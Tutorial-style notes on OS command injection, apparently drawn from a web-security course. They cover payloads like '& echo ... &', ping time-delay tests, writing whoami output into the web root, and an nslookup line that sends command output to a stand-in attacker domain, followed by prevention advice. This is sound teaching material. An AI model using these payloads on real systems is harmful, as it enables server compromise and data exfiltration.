# **OS command injection**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.</span>

## **Injecting OS commands**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">lets the user view whether an item is in stock in a particular store. This information is accessed via a URL:</span>

```vbscript-html
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">To provide the stock information, the application must query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments.</span>

```vbscript-html
stockreport.pl 381 29
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">This command outputs the stock status for the specified item, which is returned to the user, The application implements no defenses against OS command injection, so an attacker can submit the following input to execute an arbitrary command.</span>

```vbscript-html
& echo aiwefwlguh &
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">If this input is submitted in the </span>`productID`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> parameter, the command executed by the application is</span>

```vbscript-html
stockreport.pl & echo aiwefwlguh & 29
```

```vbscript-html
Error - productID was not provided
aiwefwlguh
29: command not found
```

## **Useful commands**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">After you identify an OS command injection vulnerability, it's useful to execute some initial commands to obtain information about the system.</span>

<table>
<tbody><tr><th colspan="1" rowspan="1"><p>Purpose of command</p></th><th colspan="1" rowspan="1"><p>Linux</p></th><th colspan="1" rowspan="1"><p>Windows</p></th></tr><tr><td colspan="1" rowspan="1"><p>Name of current user</p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">whoami</code></p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">whoami</code></p></td></tr><tr><td colspan="1" rowspan="1"><p>Operating system</p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">uname -a</code></p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">ver</code></p></td></tr><tr><td colspan="1" rowspan="1"><p>Network configuration</p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">ifconfig</code></p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">ipconfig /all</code></p></td></tr><tr><td colspan="1" rowspan="1"><p>Network connections</p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">netstat -an</code></p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">netstat -an</code></p></td></tr><tr><td colspan="1" rowspan="1"><p>Running processes</p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">ps -ef</code></p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">tasklist</code></p></td></tr></tbody>
</table>

## **Blind OS command injection vulnerabilities**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response</span>

**<span style="font-size: 17px">Example :</span>** 

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">imagine a website that lets users submit feedback about the site. The user enters their email address and feedback message. The server-side application then generates an email to a site administrator containing the feedback. To do this, it calls out to the </span>`mail`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> program with the submitted details:</span>

```
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

### **<span style="font-size: 17px">Detecting blind OS command injection using time delays</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">You can use an injected command to trigger a time delay, enabling you to confirm that the command was executed based on the time that the application takes to respond.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">The </span>`ping`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> command is a good way to do this, because lets you specify the number of ICMP packets to send. This enables you to control the time taken for the command to run</span>

```vbscript-html
& ping -c 10 127.0.0.1 &
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">This command causes the application to ping its loopback network adapter for 10 seconds</span>

1. Modify the `email` parameter, changing it to:

   `email=x||ping+-c+10+127.0.0.1||`

### **<span style="font-size: 17px">Exploiting blind OS command injection by redirecting output</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser</span>

**<span style="font-size: 17px">Example :</span>** 

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">if the application serves static resources from the filesystem location </span>`/var/www/static`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">, then you can submit the following input</span>

```vbscript-html
& whoami > /var/www/static/whoami.txt &
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">The </span>`>`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> character sends the output from the </span>`whoami`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> command to the specified file. You can then use the browser to fetch </span>`https://vulnerable-website.com/whoami.txt`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> to retrieve the file, and view the output from the injected command.</span>

### **<span style="font-size: 17px">Exploiting blind OS command injection using out-of-band (OAST) techniques</span>**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using </span>[OAST](https://portswigger.net/burp/application-security-testing/oast)<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> techniques.</span>

```vbscript-html
& nslookup kgji2ohoyw.web-attacker.com &
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">This payload uses the </span>`nslookup`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> command to cause a DNS lookup for the specified domain.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">The out-of-band channel provides an easy way to exfiltrate the output from injected commands</span>

```vbscript-html
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

```vbscript-html
Output : wwwuser.kgji2ohoyw.web-attacker.com
```

## **Ways of injecting OS commands**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based system</span>

```vbscript-html
&
&&
|
||
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">The following command separators work only on Unix-based systems:</span>

- `;`
- <span style="font-size: 17px">Newline (</span>`0x0a`<span style="font-size: 17px"> or </span>`\n`<span style="font-size: 17px">)</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command</span>

```vbscript-html
`Injected_Command`
$(Injected_Command)
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using </span>`"`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px"> or </span>`'`<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">) before using suitable shell metacharacters to inject a new command.</span>

## **How to prevent OS command injection attacks**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">The most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. In almost all cases, there are different ways to implement the required functionality using safer platform APIs.</span>

- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Validating that the input contains only alphanumeric characters, no other syntax or whitespace</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Validating that the input is a number</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(92, 92, 91); font-size: 18px">Validating against a whitelist of permitted values</span>